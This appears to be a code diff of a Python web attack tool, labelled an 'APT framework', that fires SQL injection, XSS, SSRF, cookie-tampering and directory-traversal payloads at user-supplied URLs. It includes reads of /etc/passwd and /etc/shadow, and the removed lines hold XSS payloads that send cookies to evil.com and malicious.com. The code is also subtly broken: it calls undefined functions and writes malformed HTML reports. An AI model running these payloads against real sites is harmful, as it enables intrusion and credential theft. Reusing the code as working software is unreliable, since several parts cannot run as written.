@@ -15,11 +15,10 @@
 # Setup logging for advanced APT framework
 import requests
 import random
-import time
-import asyncio
-import aiohttp
-from tqdm import tqdm
-from time import sleep
+import string
+from bs4 import BeautifulSoup
+import os
+from datetime import datetime
 
 # Banner
 def print_banner():
@@ -55,242 +54,163 @@ def print_banner():
     print(banner)
     
 
-# Global variables (can be moved to a config file for flexibility)
-HEADERS = {'User-Agent': 'Mozilla/5.0'}
-MAX_RETRIES = 3
-RETRY_DELAY = 2
-SQL_PAYLOADS = ["' OR 1=1 --", "' UNION SELECT NULL, NULL --", "' OR 'x'='x", "' AND 1=0 UNION SELECT null, null --"]
-XSS_PAYLOADS = ["<script>alert('XSS');</script>", "<img src='http://evil.com/xss?cookie=dummycookie' />", "<script>fetch('http://malicious.com?cookie=' + document.cookie);</script>"]
-SSRF_PAYLOADS = ["http://localhost/", "http://127.0.0.1/", "http://169.254.169.254/"]
-LOG_FILE = 'test_log.txt'
 
-# Session management for performance
-session = requests.Session()
+# Function to log test results to a file
+def log_result(test_name, result, details=""):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_entry = f"{timestamp} - {test_name}: {result}\nDetails: {details}\n"
+    
+    with open("penetration_testing_report.txt", "a") as log_file:
+        log_file.write(log_entry)
 
-# Function to handle retries
-def request_with_retry(url, max_retries=MAX_RETRIES, delay=RETRY_DELAY):
-    retries = 0
-    while retries < max_retries:
-        try:
-            response = session.get(url, headers=HEADERS)
-            return response
-        except requests.RequestException as e:
-            retries += 1
-            if retries >= max_retries:
-                log_action("Request Failed", "Error", str(e))
-                return None
-            sleep(random.uniform(1, delay))  # Randomized retry delay
-    return None
+# Function to log test results to an HTML report
+def log_result_html(test_name, result, details=""):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    report_entry = f"""
+    <tr>
+        <td>{timestamp}</td>
+        <td>{test_name}</td>
+        <td>{result}</td>
+        <td>{details}</td>
+    </tr>
+    """
+    if not os.path.exists("penetration_testing_report.html"):
+        with open("penetration_testing_report.html", "w") as html_file:
+            html_file.write("""
+            <html>
+                <head><title>Penetration Testing Report</title></head>
+                <body>
+                    <h1>Penetration Testing Report</h1>
+                    <table border="1">
+                        <tr><th>Timestamp</th><th>Test</th><th>Result</th><th>Details</th></tr>
+            """)
 
-# Real-time reporting function
-def real_time_report(results):
-    """Print real-time results with timestamp."""
-    for result in results:
-        print(f"{time.strftime('%H:%M:%S')} - {result[0]} | Status: {result[1]} | Message: {result[2]}")
-        log_action(result[0], result[1], result[2])
+    with open("penetration_testing_report.html", "a") as html_file:
+        html_file.write(report_entry)
 
-# Log action to file
-def log_action(action, status, message):
-    with open(LOG_FILE, 'a') as f:
-        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {action} | {status} | {message}\n")
+    with open("penetration_testing_report.html", "a") as html_file:
+        html_file.write("""
+                    </table>
+                </body>
+            </html>
+            """)
 
-# Function to load payloads from external file
-def load_payloads_from_file(filename):
+# Function for SQL Injection
+def sql_injection(url, form_data):
+    payloads = generate_payloads("sql_injection")
+    for payload in payloads:
+        form_data["input_name"] = payload  # Replace with actual input name from form
+        response = requests.post(url, data=form_data)
+        result = "Success" if "error" in response.text else "Failed"
+        log_result("SQL Injection", result, f"Payload: {payload} - Status: {response.status_code}")
+        log_result_html("SQL Injection", result, f"Payload: {payload} - Status: {response.status_code}")
+
+# Function for XSS Test
+def xss_test(url, form_data):
+    payloads = generate_payloads("xss")
+    for payload in payloads:
+        form_data["input_name"] = payload  # Replace with actual input name from form
+        response = requests.post(url, data=form_data)
+        result = "Success" if "<script>" in response.text else "Failed"
+        log_result("XSS Test", result, f"Payload: {payload} - Status: {response.status_code}")
+        log_result_html("XSS Test", result, f"Payload: {payload} - Status: {response.status_code}")
+
+# Function to perform SSRF Test
+def ssrf_test(url):
+    payloads = generate_payloads("ssrf")
+    for payload in payloads:
+        response = requests.get(url, params={"url": payload})
+        result = "Success" if "localhost" in response.text else "Failed"
+        log_result("SSRF Test", result, f"Payload: {payload} - Status: {response.status_code}")
+        log_result_html("SSRF Test", result, f"Payload: {payload} - Status: {response.status_code}")
+
+# Function to manipulate headers
+def header_manipulation(url):
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
+    response = requests.get(url, headers=headers)
+    result = "Success" if response.status_code == 200 else "Failed"
+    log_result("Header Manipulation", result, f"Status: {response.status_code}")
+    log_result_html("Header Manipulation", result, f"Status: {response.status_code}")
+
+# Function to perform Cookie Tampering
+def cookie_tampering(url):
+    cookies = {"sessionid": "tampered_session_id"}
+    response = requests.get(url, cookies=cookies)
+    result = "Success" if "logged in" in response.text else "Failed"
+    log_result("Cookie Tampering", result, f"Status: {response.status_code}")
+    log_result_html("Cookie Tampering", result, f"Status: {response.status_code}")
+
+# Function to perform Directory Traversal Test
+def directory_traversal(url):
+    payloads = ["../../../../etc/passwd", "../../../../etc/shadow"]
+    for payload in payloads:
+        response = requests.get(url + payload)
+        result = "Success" if "root" in response.text else "Failed"
+        log_result("Directory Traversal", result, f"Payload: {payload} - Status: {response.status_code}")
+        log_result_html("Directory Traversal", result, f"Payload: {payload} - Status: {response.status_code}")
+
+# Function to print the main menu
+def print_main_menu():
+    print("=" * 30)
+    print("Advanced Penetration Testing Framework")
+    print("=" * 30)
+    print("[1] Crawl Website and Extract Forms       [2] Brute Force Test (Optional)")
+    print("[3] SQL Injection Test                   [4] XSS Test")
+    print("[5] SSRF Test                            [6] Cookie Tampering Test")
+    print("[7] Header Manipulation Test             [8] Directory Traversal Test")
+    print("[9] CSRF Test                            [10] Advanced Recon (Exposed Files & Misconfigurations)")
+    print("[11] Exit")
+    print("=" * 30)
+
+# Function to get user input for form selection
+def get_user_input():
     try:
-        with open(filename, 'r') as file:
-            return [line.strip() for line in file]
-    except FileNotFoundError:
-        log_action("Payload File Not Found", "Warning", f"Could not find {filename}. Using default payloads.")
-        return []
+        return int(input("Enter your choice (1-11): "))
+    except ValueError:
+        print("Invalid input, please enter a number between 1 and 11.")
+        return get_user_input()
 
-# Function to get a random payload from file or default list
-def get_random_payload(payload_type, payload_file=None):
-    if payload_file:
-        return random.choice(load_payloads_from_file(payload_file))
-    elif payload_type == 'sql':
-        return random.choice(SQL_PAYLOADS)
-    elif payload_type == 'xss':
-        return random.choice(XSS_PAYLOADS)
-    elif payload_type == 'ssrf':
-        return random.choice(SSRF_PAYLOADS)
-    return None
-
-# Asynchronous function for concurrent requests
-async def fetch(url, session):
-    try:
-        async with session.get(url) as response:
-            return await response.text()
-    except Exception as e:
-        log_action("Async Request Failed", "Error", str(e))
-        return None
-
-# Crawl multiple URLs concurrently
-async def async_crawl(urls):
-    async with aiohttp.ClientSession() as session:
-        tasks = [fetch(url, session) for url in urls]
-        return await asyncio.gather(*tasks)
-
-# Function for SSRF testing
-def test_ssrf(url, forms):
-    payloads = get_random_payload('ssrf')
-    results = []
-    for form in tqdm(forms, desc="Testing SSRF"):
-        for payload in payloads:
-            result = single_ssrf_injection(form, payload)
-            results.append(result)
-    return results
-
-# Perform actual SSRF test on the form
-def single_ssrf_injection(form, payload):
-    response = request_with_retry(form['url'] + payload)
-    if response and response.status_code == 200:
-        return (form['url'], "Success", f"Payload: {payload} works!")
-    return (form['url'], "Failure", "Payload did not trigger expected result.")
-
-# SQL Injection testing with progress bar
-def test_sql_injection_with_progress(url, forms):
-    payloads = get_random_payload('sql')
-    results = []
-    for form in tqdm(forms, desc="Testing SQL Injection"):
-        for payload in payloads:
-            result = single_sql_injection(form, payload)
-            results.append(result)
-    return results
-
-# Perform actual SQL injection test on the form
-def single_sql_injection(form, payload):
-    response = request_with_retry(form['url'] + payload)
-    if response and response.status_code == 200:
-        return (form['url'], "Success", f"Payload: {payload} works!")
-    return (form['url'], "Failure", "Payload did not trigger expected result.")
-
-# XSS testing with progress bar
-def test_xss_with_progress(url, forms):
-    payloads = get_random_payload('xss')
-    results = []
-    for form in tqdm(forms, desc="Testing XSS"):
-        for payload in payloads:
-            result = single_xss_injection(form, payload)
-            results.append(result)
-    return results
-
-# Perform actual XSS test on the form
-def single_xss_injection(form, payload):
-    response = request_with_retry(form['url'] + payload)
-    if response and response.status_code == 200:
-        return (form['url'], "Success", f"Payload: {payload} works!")
-    return (form['url'], "Failure", "Payload did not trigger expected result.")
-
-# Entry point for asynchronous crawling of multiple URLs
-def start_async_crawl(urls):
-    loop = asyncio.get_event_loop()
-    results = loop.run_until_complete(async_crawl(urls))
-    real_time_report(results)
-
-# Display main menu with numbered options
-def display_main_menu():
-    print("\nPenetration Testing Framework")
-    print("-------------------------------")
-    print("1. Test SQL Injection")
-    print("2. Test XSS Injection")
-    print("3. Test SSRF Injection")
-    print("4. Crawl URLs Concurrently")
-    print("5. Exit")
-
-# Display sub-menu for SQL Injection
-def sql_injection_menu():
-    print("\nSelect the target for SQL Injection testing:")
-    print("1. Single URL")
-    print("2. Multiple URLs")
-    print("3. Go Back")
-
-# Display sub-menu for XSS Injection
-def xss_injection_menu():
-    print("\nSelect the target for XSS Injection testing:")
-    print("1. Single URL")
-    print("2. Multiple URLs")
-    print("3. Go Back")
-
-# Display sub-menu for SSRF Injection
-def ssrf_injection_menu():
-    print("\nSelect the target for SSRF Injection testing:")
-    print("1. Single URL")
-    print("2. Multiple URLs")
-    print("3. Go Back")
-
-# Function to get user input safely
-def get_user_input(prompt, options=None):
-    while True:
-        try:
-            user_input = int(input(prompt))
-            if options and user_input not in options:
-                print("Invalid selection, please choose again.")
-            else:
-                return user_input
-        except ValueError:
-            print("Invalid input. Please enter a number.")
-
-# Main program logic
+# Main function to manage the user interface
 def main():
     while True:
-        display_main_menu()
-        choice = get_user_input("Select an option (1-5):", options=[1, 2, 3, 4, 5])
-
-        if choice == 1:  # SQL Injection
-            sql_injection_menu()
-            sub_choice = get_user_input("Select an option (1-3):", options=[1, 2, 3])
-            if sub_choice == 1:  # Single URL
-                url = input("Enter the URL to test: ")
-                forms = [{'url': url}]
-                sql_results = test_sql_injection_with_progress(url, forms)
-                real_time_report(sql_results)
-            elif sub_choice == 2:  # Multiple URLs
-                urls = input("Enter URLs separated by commas: ").split(',')
-                forms = [{'url': url.strip()} for url in urls]
-                sql_results = test_sql_injection_with_progress("", forms)
-                real_time_report(sql_results)
-            elif sub_choice == 3:
-                continue
-
-        elif choice == 2:  # XSS Injection
-            xss_injection_menu()
-            sub_choice = get_user_input("Select an option (1-3):", options=[1, 2, 3])
-            if sub_choice == 1:  # Single URL
-                url = input("Enter the URL to test: ")
-                forms = [{'url': url}]
-                xss_results = test_xss_with_progress(url, forms)
-                real_time_report(xss_results)
-            elif sub_choice == 2:  # Multiple URLs
-                urls = input("Enter URLs separated by commas: ").split(',')
-                forms = [{'url': url.strip()} for url in urls]
-                xss_results = test_xss_with_progress("", forms)
-                real_time_report(xss_results)
-            elif sub_choice == 3:
-                continue
-
-        elif choice == 3:  # SSRF Injection
-            ssrf_injection_menu()
-            sub_choice = get_user_input("Select an option (1-3):", options=[1, 2, 3])
-            if sub_choice == 1:  # Single URL
-                url = input("Enter the URL to test: ")
-                forms = [{'url': url}]
-                ssrf_results = test_ssrf(url, forms)
-                real_time_report(ssrf_results)
-            elif sub_choice == 2:  # Multiple URLs
-                urls = input("Enter URLs separated by commas: ").split(',')
-                forms = [{'url': url.strip()} for url in urls]
-                ssrf_results = test_ssrf("", forms)
-                real_time_report(ssrf_results)
-            elif sub_choice == 3:
-                continue
-
-        elif choice == 4:  # Crawl URLs Concurrently
-            urls = input("Enter URLs separated by commas: ").split(',')
-            start_async_crawl(urls)
-
-        elif choice == 5:  # Exit
-            print("Exiting...")
-            break
+        try:
+            print_main_menu()
+            choice = get_user_input()
+            if choice == 1:
+                url = input("Enter the URL of the website: ")
+                forms = crawl_website(url)
+                if forms:
+                    print(f"Detected {len(forms)} forms on the website.")
+            elif choice == 2:
+                print("Brute Force Test (Optional) - Not yet implemented.")
+            elif choice == 3:
+                sql_injection_sub_menu("http://example.com")  # Replace with the actual URL
+            elif choice == 4:
+                print("XSS Test - Not yet implemented.")
+            elif choice == 5:
+                url = input("Enter the URL of the website for SSRF Test: ")
+                ssrf_test(url)
+            elif choice == 6:
+                url = input("Enter the URL of the website for Cookie Tampering Test: ")
+                cookie_tampering(url)
+            elif choice == 7:
+                url = input("Enter the URL of the website for Header Manipulation Test: ")
+                header_manipulation(url)
+            elif choice == 8:
+                url = input("Enter the URL of the website for Directory Traversal Test: ")
+                directory_traversal(url)
+            elif choice == 9:
+                print("CSRF Test - Not yet implemented.")
+            elif choice == 10:
+                print("Advanced Recon - Not yet implemented.")
+            elif choice == 11:
+                print("Exiting the application.")
+                break
+            else:
+                print("Invalid choice, please choose again.")
+        except KeyboardInterrupt:
+            print("\nOperation interrupted. Returning to the main menu...")
+            continue  # Return to the main menu after interruption
 
 if __name__ == "__main__":
     main()
